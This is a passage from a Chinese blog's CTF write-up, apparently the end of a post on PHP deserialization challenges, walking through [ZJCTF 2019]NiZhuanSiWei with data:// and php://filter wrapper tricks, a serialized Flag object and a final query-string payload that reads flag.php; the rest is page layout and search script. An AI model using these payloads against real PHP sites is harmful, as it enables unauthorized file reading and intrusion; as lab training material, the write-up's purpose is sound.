class="built_in">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>第一步构造满足条件的text，利用data协议将文件流重定向</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/NiZhuanSiWei/NiZhuanSiWei.jpg" alt=""><br>第二步就是要获取useless.php的代码,利用filter伪协议</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo</span><br></pre></td></tr></table></figure>
+<p>解码后为</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public <span class="variable">$file</span>;  </span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__tostring</span></span>()&#123;  </span><br><span class="line">        <span class="keyword">if</span>(isset(<span class="variable">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="built_in">echo</span> file_get_contents(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="built_in">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>反序列化漏洞利用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public <span class="variable">$file</span>;  </span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__tostring</span></span>()&#123;  </span><br><span class="line">        <span class="keyword">if</span>(isset(<span class="variable">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="built_in">echo</span> file_get_contents(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="built_in">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$a</span>=new Flag();</span><br><span class="line"><span class="variable">$a</span>-&gt;file=<span class="string">"flag.php"</span>;</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>构造payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:<span class="string">"Flag"</span>:1:&#123;s:4:<span class="string">"file"</span>;s:8:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure>
+<p>在源码中拿到flag</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/04/03/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5SSTI/" rel="next" title="服务端模板注入(SSTI)">
+                <i class="fa fa-chevron-left"></i> 服务端模板注入(SSTI)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/05/01/ISCC-2020/" rel="prev" title="ISCC-2020">
+                ISCC-2020 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+  
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/header.jpg"
+                alt="w1ndy" />
+            
+              <p class="site-author-name" itemprop="name">w1ndy</p>
+              <p class="site-description motion-element" itemprop="description">时间从来不说话，却回答了所有问题</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">39</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+<div id="music163player">
+          <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1430823226&auto=1&height=66"></iframe>
+</div>
+          
+          
+
+          
+          
+
+          
+          
+
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <!-- modify icon to fire by szw -->
+                <i class="fa fa-history fa-" aria-hidden="true"></i>
+                近期文章
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                
+                  <li>
+                    <a href="/2020/07/07/CVE-2020-7066/" title="CVE-2020-7066" target="_blank">CVE-2020-7066</a>
+                  </li>
+          
+                  <li>
+                    <a href="/2020/06/30/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="JavaScript原型链污染" target="_blank">JavaScript原型链污染</a>
+                  </li>
+          
+                  <li>
+                    <a href="/2020/06/22/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/" title="现代密码学期末复习" target="_blank">现代密码学期末复习</a>
+                  </li>
+          
+                  <li>
+                    <a href="/2020/06/09/EternalBlue/" title="EternalBlue" target="_blank">EternalBlue</a>
+                  </li>
+          
+                  <li>
+                    <a href="/2020/05/23/WHUCTF/" title="WHUCTF" target="_blank">WHUCTF</a>
+                  </li>
+          
+      </ul>
+    </div>
+     
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#极客大挑战-2019-PHP-wakeup-函数绕过"><span class="nav-text">[极客大挑战 2019]PHP(__wakeup()函数绕过)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#攻防世界-Web-php-unserialize"><span class="nav-text">[攻防世界]Web_php_unserialize</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#安恒月赛-Ezunserialize"><span class="nav-text">[安恒月赛]Ezunserialize</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BUU-CODE-REVIEW-1"><span class="nav-text">BUU CODE REVIEW 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ZJCTF-2019-NiZhuanSiWei"><span class="nav-text">[ZJCTF 2019]NiZhuanSiWei</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">w1ndy</span>
+
+  
+</div>
+<!--
+
+
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+-->
+<span id="sitetime"></span>
+<script language=javascript>
+	function siteTime(){
+		window.setTimeout("siteTime()", 1000);
+		var seconds = 1000;
+		var minutes = seconds * 60;
+		var hours = minutes * 60;
+		var days = hours * 24;
+		var years = days * 365;
+		var today = new Date();
+		var todayYear = today.getFullYear();
+		var todayMonth = today.getMonth()+1;
+		var todayDate = today.getDate();
+		var todayHour = today.getHours();
+		var todayMinute = today.getMinutes();
+		var todaySecond = today.getSeconds();
+		/* 
+		Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+		year - 作为date对象的年份，为4位年份值
+		month - 0-11之间的整数，做为date对象的月份
+		day - 1-31之间的整数，做为date对象的天数
+		hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+		minutes - 0-59之间的整数，做为date对象的分钟数
+		seconds - 0-59之间的整数，做为date对象的秒数
+		microseconds - 0-999之间的整数，做为date对象的毫秒数
+        */
+		var t1 = Date.UTC(2019,11,26,00,00,00); //北京时间2018-2-13 00:00:00
+		var t2 = Date.UTC(todayYear,todayMonth,todayDate,todayHour,todayMinute,todaySecond);
+		var diff = t2-t1;
+		var diffYears = Math.floor(diff/years);
+		var diffDays = Math.floor((diff/days)-diffYears*365);
+		var diffHours = Math.floor((diff-(diffYears*365+diffDays)*days)/hours);
+		var diffMinutes = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours)/minutes);
+		var diffSeconds = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours-diffMinutes*minutes)/seconds);
+		document.getElementById("sitetime").innerHTML=" 已运行"+/*diffYears+" 年 "+*/diffDays+" 天 "+diffHours+" 小时 "+diffMinutes+" 分钟 "+diffSeconds+" 秒";
+	}
+	siteTime();
+</script>
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+  <!-- 页面点击小红心 -->
+  <script type="text/javascript" src="/js/src/love.js"></script>
+</body>
+</html>
